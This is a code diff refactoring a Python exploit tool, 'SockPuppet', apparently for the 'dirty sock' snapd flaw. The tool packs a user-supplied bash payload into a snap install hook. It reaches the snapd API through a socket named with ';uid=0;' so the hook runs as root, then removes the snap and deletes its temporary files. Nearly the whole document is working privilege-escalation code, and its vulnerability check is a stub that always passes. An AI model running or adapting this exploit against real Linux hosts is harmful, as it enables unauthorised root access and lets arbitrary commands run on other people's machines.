@@ -1,6 +1,7 @@
 import os
 import socket
 import sys
+import shutil
 import tempfile
 import argparse
 import subprocess
@@ -17,8 +18,8 @@ def parse_arguments():
     parser.add_argument("-u", "--uid", type=int, default=0, help='userid [default=0]')
     parser.add_argument("-f", "--file", type=str, help='name of file bash script to execute as a payload')
     parser.add_argument("-c", "--command", type=str, help='command to execute')
-    parser.add_argument("--force", action="store_true",
-                        help='force the exploit even if not vulnerability detection fails')
+    parser.add_argument("-s", "--skipcleanup", action="store_true",
+                        help='skip cleanup of the files used to build the snap')
     args = parser.parse_args()
     if args.file is not None:
         args.payload = open(args.file, 'r').read()
@@ -40,15 +41,18 @@ class SockPuppet:
     base = ''
     sock = None
     snap_location = ''
+    install_contents = ''
+    yaml_contents = ''
 
-    def __init__(self, base_dir, name='sock-puppet', summary='empty snap', description=''):
+    def __init__(self, base_dir, payload, name='sock-puppet', summary='empty snap', description=''):
         self.name = name
         self.summary = summary
         self.description = description
         self.base = base_dir
         os.chmod(base_dir, 0o775)
+        self.payload = payload
 
-    def build_yaml(self):
+    def _build_yaml(self):
         SNAP_TEMPLATE = """
         name: <%NAME%>
         version: '0.1'
@@ -63,18 +67,17 @@ class SockPuppet:
         SUMMARY_TAG = '<SUMMARY%>'
         DESCRIPTION_TAG = '<%DESCRIPTION%>'
 
-        return SNAP_TEMPLATE.replace(NAME_TAG, self.name)\
-                            .replace(SUMMARY_TAG, self.summary)\
-                            .replace(DESCRIPTION_TAG, self.description)
+        self.yaml_contents = SNAP_TEMPLATE.replace(NAME_TAG, self.name)\
+                                          .replace(SUMMARY_TAG, self.summary)\
+                                          .replace(DESCRIPTION_TAG, self.description)
 
-    def build_install(self, cmd):
+    def _build_install(self):
         install_contents = ''
-        if '#!/' not in cmd:
+        if '#!/' not in self.payload:
             install_contents += '#!/bin/bash\n'
-        install_contents += cmd + '\n'
-        return install_contents
+        self.install_contents += self.payload + '\n'
 
-    def build_directory_structure(self):
+    def _build_directory_structure(self):
         directories = ['meta', os.path.join('meta', 'hooks'), 'snap', os.path.join('snap', 'hooks')]
         for directory in directories:
             try:
@@ -89,31 +92,29 @@ class SockPuppet:
 
         return True
 
-    def write_snap_yaml(self, contents):
+    def _write_snap_yaml(self):
         filename = os.path.join(self.base, os.path.join('meta', 'snap.yaml'))
         f = open(filename, 'w')
-        f.write(contents)
+        f.write(self.yaml_contents)
         f.flush()
         f.close()
         os.chmod(filename, 0o664)
         print("[+] Successfully created the file %s" % filename)
 
-    def write_install(self, contents):
-        filenames = [os.path.join(self.base, os.path.join('meta', 'hooks', 'install'))]#,  # Default install hook location
-                     #os.path.join(self.base, os.path.join('snap', 'hooks', 'install'))]  # Needed for building with snapcraft. #TODO: Test removing this second location
-        for filename in filenames:
-            f = open(filename, 'w')
-            f.write(contents)
-            f.flush()
-            f.close()
-            os.chmod(filename, 0o775)
-            print("[+] Successfully created the file %s" % filename)
+    def _write_install(self):
+        filename = os.path.join(self.base, os.path.join('meta', 'hooks', 'install'))
+        f = open(filename, 'w')
+        f.write(self.install_contents)
+        f.flush()
+        f.close()
+        os.chmod(filename, 0o775)
+        print("[+] Successfully created the file %s" % filename)
 
-    def build_snap(self):
+    def _build_snap(self):
         snap_dir = tempfile.mkdtemp()
         self.snap_location = os.path.join(snap_dir, 'payload.snap')
         subprocess.check_output(['mksquashfs', self.base, self.snap_location])
-        return self.snap_location
+        print("[+] Successfully created the snap at %s" % self.snap_location)
 
     ####################################################################################################################
     # Section: Code related to executing the exploit
@@ -123,7 +124,7 @@ class SockPuppet:
     #               - https://initblog.com/2019/dirty-sock/
     ####################################################################################################################
 
-    def check_if_vulnerable(self):
+    def _check_if_vulnerable(self):
         return True     # TODO: Implement
 
     def _create_unix_socket(self):
@@ -141,12 +142,12 @@ class SockPuppet:
         print("[+] Connecting to snapd API")
         sock.connect('/run/snapd.socket')
 
-    def connect_to_api(self):
+    def _connect_to_api(self):
         dirtysock = self._create_unix_socket()
         self.sock = self._bind_unix_socket(dirtysock)
         self._connect_to_api(self.sock)
 
-    def install_snap(self):
+    def _install_snap(self):
         # Read the snap file we created into a byte array
         blob = open(self.snap_location, 'rb').read()
 
@@ -207,7 +208,7 @@ Content-Type: application/octet-stream
         # on the machine.
         time.sleep(8)
 
-    def remove_snap(self):
+    def _remove_snap(self):
         post_payload = ('{"action": "remove",'
                         ' "snaps": ["%s"]}' % self.name)
         http_req = ('POST /v2/snaps HTTP/1.1\r\n'
@@ -239,8 +240,22 @@ Content-Type: application/octet-stream
         # may fail.
         time.sleep(5)
 
-    def cleanup(self):
-        pass
+    def _cleanup(self):
+        shutil.rmtree(self.base)
+        shutil.rmtree(self.snap_location.replace('payload.snap', ''))
+
+    def execute(self):
+        self._build_directory_structure()       # Create the directory structure for the snap
+        self._build_install()                   # Build the install hook contents
+        self._build_yaml()                      # Build the yaml metadata file for the snap
+        self._write_install()                   # Write the install hook contents to the proper location
+        self._write_snap_yaml()                 # Write the yaml metadata file to the proper location
+        self._build_snap()                      # Build the snap, which is just creating a squashfs
+        self._connect_to_api()                  # Connect to the api using a dirty sock, importance here is ;uid=0; at the end of socket name
+        self._remove_snap()                     # Remove the snap if it happens to be installed already
+        self._install_snap()                    # Install the snap
+        self._remove_snap()                     # Remove the snap since we just needed the install hook to run and don't have any actual functionality in the snap
+        self._cleanup()                         # Cleanup the temporary files
 
 
 if __name__ == '__main__':
@@ -252,41 +267,7 @@ if __name__ == '__main__':
     output_dir = tempfile.mkdtemp()
 
     # Create sockpuppet instance
-    puppet = SockPuppet(output_dir)
+    sockpuppet = SockPuppet(output_dir, arguments.payload)
 
-    # Make sure this is a vulnerable version
-    if not puppet.check_if_vulnerable():
-        print("[-] System does not appear to be vulnerable. Pass '--force' if you wish to force.")
-        os.exit(-1)
-
-    print("[*] Creating snap contents in " + puppet.base)
-    if not puppet.build_directory_structure():
-        print("[-] Failed to create directory structure")
-        os.exit(-1)
-
-    # Create the install script
-    install_contents = puppet.build_install(arguments.payload)
-    puppet.write_install(install_contents)
-
-    # Create the meta files that will be used to build our snap
-    yaml_contents = puppet.build_yaml()
-    puppet.write_snap_yaml(yaml_contents)
-
-    # Create snap
-    snap_location = puppet.build_snap()
-    print("[+] Successfully built the snap in %s" % snap_location)
-
-    # Setup connection to API
-    puppet.connect_to_api()
-
-    # Remove any old installs of the snap
-    puppet.remove_snap()
-
-    # Install snap
-    puppet.install_snap()
-
-    # Remove snap
-    puppet.remove_snap()
-
-    # Cleanup
-    puppet.cleanup()
+    # Execute
+    sockpuppet.execute()
